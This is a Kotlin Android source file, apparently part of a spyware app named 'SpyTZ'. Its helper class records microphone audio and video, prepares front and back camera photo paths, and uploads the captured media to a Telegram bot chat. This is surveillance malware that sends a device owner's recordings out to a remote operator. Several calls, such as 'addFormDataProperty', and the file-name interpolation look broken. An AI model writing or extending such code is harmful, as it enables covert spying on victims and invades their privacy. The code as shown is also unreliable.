package com.spy.tz

import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import okhttp3.*
import okio.IOException
import org.json.JSONObject
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class TelegramBotHelper(private val context: Context) {
    companion object {
        private const val TAG = "SpyTZ_Bot"
        private const val BASE_URL = "https://api.telegram.org"
    }

    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var cameraExecutor: ExecutorService = Executors.newSingleThreadExecutor()
    private var imageCapture: ImageCapture? = null
    private var cameraProviderFuture: ProcessCameraProvider? = null

    fun sendPhotoToBot(botToken: String, chatId: String, filePath: String, caption: String = "") {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", file.name, 
                RequestBody.create(MediaType.parse("image/jpeg"), file))
            .addFormDataProperty("caption", caption)
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendPhoto")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Photo upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Photo uploaded successfully")
            }
        })
    }

    fun sendVideoToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataProperty("chat_id", chatId)
            .addFormDataPart("video", file.name, 
                RequestBody.create(MediaType.parse("video/mp4"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVideo")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Video upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Video uploaded successfully")
            }
        })
    }

    fun sendAudioToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataProperty("chat_id", chatId)
            .addFormDataProperty("voice", file.name, 
                RequestBody.create(MediaType.parse("audio/ogg"), file)) // Or audio/mpeg
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVoice")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Audio upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Audio uploaded successfully")
            }
        })
    }

    // --- Recording Logic ---

    fun startRecording(isVideo: Boolean, isFrontCamera: Boolean = false) {
        mediaRecorder = MediaRecorder()
        mediaRecorder?.let {
            if (isVideo) {
                it.setVideoSource(MediaRecorder.VideoSource.SURFACE) // Requires SurfaceTexture usually
                it.setAudioSource(MediaRecorder.AudioSource.MIC)
                it.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                it.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                it.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            } else {
                it.setAudioSource(MediaRecorder.AudioSource.MIC)
                it.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                it.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            }

            val timeStamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(java.util.Date())
            val type = if (isVideo) "video" else "audio"
            outputFile = File(context.getExternalFilesDir(null), "$type_$timeStamp.${if(isVideo) "mp4" else "3gp"}")
            
            it.setOutputFile(outputFile?.absolutePath)
            
            try {
                it.prepare()
                it.start()
                Log.d(TAG, "Recording started: $outputFile")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    fun stopRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return outputFile
    }

    fun takePhoto(isFrontCamera: Boolean): String? {
        // Note: Actual capture logic requires Activity Lifecycle owner passed from outside
        // For this helper, we just prepare the path. The actual capture happens in NotificationService or Activity
        val outputDirectory = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        val timeStamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(java.util.Date())
        val fileName = "photo_${if(isFrontCamera) "front" else "back"}_$timeStamp.jpg"
        return File(outputDirectory, fileName).absolutePath
    }
}
